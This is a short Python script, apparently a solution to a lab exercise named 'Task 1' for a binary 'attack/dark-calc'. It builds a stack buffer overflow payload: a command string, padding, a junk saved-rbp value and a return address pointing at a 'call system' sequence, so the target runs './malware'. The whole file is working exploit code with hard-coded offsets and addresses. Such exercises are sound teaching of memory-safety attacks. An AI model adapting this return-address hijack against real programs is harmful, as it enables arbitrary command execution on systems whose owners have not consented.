#!/usr/bin/env python3
"""Task 1: build the payload for attack/dark-calc.

Overflow input()'s stack buffer, overwrite the return address to jump
directly into eval()'s `mov $0x6030d0,%edi; call system` (0x401a6b),
so that command_buf == "./malware" is executed by system().
"""
import sys

payload = b"./malware\x00"                   # strcpy 之后 command_buf == "./malware"
payload += b"A" * (16 - 10)                   # 补齐 expression 到 16 字节
payload += b"B" * 8                            # 覆盖保存的 rbp
payload += (0x401a6b).to_bytes(8, "little")   # 返回地址 -> mov $0x6030d0,%edi; call system

sys.stdout.buffer.write(payload)
